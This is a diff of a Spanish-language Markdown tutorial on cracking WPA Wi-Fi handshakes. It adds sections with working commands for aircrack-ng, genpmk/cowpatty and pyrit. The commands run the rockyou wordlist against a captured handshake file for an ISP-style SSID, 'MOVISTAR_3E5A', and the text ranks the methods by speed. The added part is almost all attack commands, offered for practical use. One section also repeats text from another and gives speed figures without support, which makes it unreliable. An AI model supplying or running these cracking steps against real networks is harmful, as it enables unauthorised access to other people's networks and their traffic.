@@ -25,10 +25,10 @@
 * [EXTRACCION DEL HASH EN EL  HANDSHAKE](#item14)
 ### FUERZA BRUTA AL HASH > CONTRASEÑA
 * [CON JOHN THE RIPPER](#item15)
-* [FUERZA BRUTA CON AIRCRACK](#item16)
+* [FUERZA BRUTA CON AIRCRACK ( La mas Recomendable)](#item16)
 * [FUERZA BRUTA CON GEMPMK](#item17)
 * [FUERZA BRUTA CON PYRIT](#item18)
-* [FUERZA BRUTA CON PYRIT Y PRECOMPUTACION](#item19)
+* [FUERZA BRUTA CON PYRIT Y PRECOMPUTACION(La mas Rapida)](#item19)
 
 <a name="item1"></a>
 ### Chequeo de tarjeta y resolucion de conflictos
@@ -275,9 +275,45 @@ SINOPSIS: YA vamos al turror, sacar el hash para posteriormente romperlo y sacar
     $ john --show miHash --format=wpapsk-pmk
  ```
 
+<a name="item16"></a>
+### FUERZA BRUTA CON AIRCRACK (La mas Recomendable)
 
+---- NOS AHORARIAMOS VALIDANDO, TRATAMIENTO Y EXTRACCION DEL HASH---- 
+  
+``` $ aircrack-ng -w rockyou.txt Captura-01.cap ```
 
+<a name="item17"></a>
+### FUERZA BRUTA CON GEMPMK
 
+Una forma de ir 100 veces mas rapido que con aircrack-ng es con gempmk pero tiene 
+    La contra de primero convertir el diccionario a dic.genpmk
+    
+``` $ genpmk -f rockyou.txt -d rockyou.genpmk -s MOVISTAR_3E5A ```   (EN -s se pone el nombre del SSID )
 
+Cuando termino de realizar la precomputacion del .dic a .genpmk
 
+``` $ cowpatty -d rockyou.genpmk -r Captura-01.cap -s MOVISTAR_3E5A ```
 
+<a name="item18"></a>
+### FUERZA BRUTA CON PYRIT
+
+Una forma de ir 450 veces mas rapido que con aircrack-ng es con gempmk pero tiene 
+    La contra de primero convertir el diccionario a dic.genpmk  
+    
+``` $ genpmk -f rockyou.txt -d rockyou.genpmk -s MOVISTAR_3E5A ```   (EN -s se pone el nombre del SSID )
+ Cuando termino de realizar la precomputacion del .dic a .genpmk
+``` $ pyrit -e   MOVISTAR_3E5A -i rockyou.genpmk -r Captura-01.cap attack_cowpatty ```
+    
+<a name="item19"></a>
+### FUERZA BRUTA CON PYRIT Y PRECOMPUTACION ( La mas rapida)
+
+LA MAS RAPIDA DE PRECOMPUTACION : 150VECES MAS RAPIDO QUE LA ANTERIOR 
+La contra de primero convertir el diccionario a dic.genpmk  
+   
+``` 
+    $ pyrit -i rockyou.txt import_passwords
+    $ pyrit -e MOVISTAR_3E5A create_essid
+    $ pyrit batch
+```
+
+Seguiremos por aqui en un futuro o no xD
